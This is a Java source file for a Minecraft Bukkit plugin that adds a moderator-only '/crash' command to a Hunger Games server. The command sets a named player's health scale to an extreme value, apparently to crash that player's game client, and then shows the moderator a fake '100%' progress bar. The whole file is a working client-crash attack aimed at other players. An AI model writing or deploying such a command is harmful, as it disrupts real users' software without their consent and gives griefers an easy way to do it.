package spinghg.hungergames.commands;

import java.sql.SQLException;
import java.util.logging.Level;

import spinghg.hungergames.libsHg;

import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

public class Crash
  implements CommandExecutor
{
  private libsHg pl;

  public Crash(libsHg plugin)
  {
    this.pl = plugin;
  }

  @SuppressWarnings("static-access")
public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args)
  {
	    if (!(sender instanceof Player))
	    {
	      sender.sendMessage("§9Erro> §7Somente jogadores podem executar este comando!");
	      return true;
	    }
    final Player player = (Player)sender;

    if (cmd.getName().equalsIgnoreCase("crash"))
    	if (player.hasPermission("hg.mod")) 
    {
    		  if (args.length == 0)
    	      {
    			player.sendMessage("§ccrash -> jogador ?");
    	      }
      if (args.length == 1)
      {
        Player target = Bukkit.getPlayerExact(args[0]);
        if (target == null)
        {
          player.sendMessage("§aJogador não encontrado!");
          return true;
        }
        target.setGameMode(GameMode.SURVIVAL);
        target.setHealthScale(9.4959299499999999999999999999E8D);
   	    player.sendMessage("§f Carregando crash no " + target.getName());
   	    player.sendMessage("§c██████████ §7 100%");
      
      } 
  }
	return false;
  }
}
